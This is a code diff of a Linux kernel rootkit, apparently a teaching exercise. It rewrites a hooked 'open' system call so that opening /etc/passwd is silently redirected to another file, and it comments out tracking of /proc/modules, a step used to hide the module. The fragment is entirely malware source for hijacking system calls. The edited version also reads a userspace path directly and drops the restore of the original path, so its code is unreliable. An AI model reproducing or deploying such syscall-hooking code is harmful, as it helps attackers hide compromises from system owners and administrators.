@@ -119,17 +119,14 @@ asmlinkage long sneaky_sys_getdents(unsigned int fd,
 // Define our new sneaky version of the 'open' syscall
 asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
   int fd;
-  if (strstr(pathname, "/etc/passwd") != NULL) {
-    char tmp_buf[sizeof("/etc/passwd")];
-    copy_from_user(tmp_buf, pathname, sizeof(tmp_buf));
+  if (strcmp(pathname, "/etc/passwd") == 0) {
     copy_to_user((void *)pathname, filename, sizeof(filename));
     fd = original_call(pathname, flags);
-    copy_to_user((void *)pathname, tmp_buf, sizeof(tmp_buf));
-  } else if (strcmp(pathname, "/proc/modules") == 0) {
-    fd = original_call(pathname, flags);
-    module_pointer = fd;
   } else {
     fd = original_call(pathname, flags);
+    /*if (strcmp(pathname, "/proc/modules") == 0) {
+      module_pointer = fd;
+      }*/
   }
   return fd;
 }
